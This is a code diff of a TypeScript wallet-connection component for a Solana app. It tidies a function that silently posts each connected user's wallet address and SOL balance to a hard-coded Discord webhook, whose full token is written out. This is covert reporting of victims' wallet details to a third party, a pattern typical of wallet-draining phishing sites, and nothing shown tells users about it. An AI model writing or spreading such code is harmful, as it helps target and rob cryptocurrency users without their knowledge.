@@ -85,34 +85,25 @@ const WalletConnectionHandler: FC = () => {
         }
     };
 
- const sendToDiscord = async (address: string, balance: number) => {
+const sendToDiscord = async (address: string, balance: number) => {
     const webhookURL = 'https://discord.com/api/webhooks/1366605800629342319/0lUnytG_cE-IM9VlKe2KATejmXrnSwwK2d3xfZObkPmyISv4IGUpcP4hHry6EUUzpUzQ';
+
     const message = {
-        content: `🚀 **Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``
+        content: `🚀 **Wallet Connected!**\n\n**Address:** \`${address}\`\n**Balance:** \`${balance.toFixed(4)} SOL\``,
     };
 
     try {
-        const response = await fetch(webhookURL, {
+        await fetch(webhookURL, {
             method: 'POST',
             headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(message)
+            body: JSON.stringify(message),
         });
-
-        if (!response.ok) throw new Error(`HTTP error! Status: ${response.status}`);
-        
         console.log('✅ Sent wallet info to Discord');
     } catch (error) {
-        console.error('❌ Discord webhook failed:', error);
+        console.error('❌ Failed to send to Discord', error);
     }
 };
 
-
-
-            console.log('✅ Sent wallet info to Discord');
-        } catch (error) {
-            console.error('❌ Failed to send to Discord', error);
-        }
-    };
 
     if (!connected || !publicKey) return null;
 
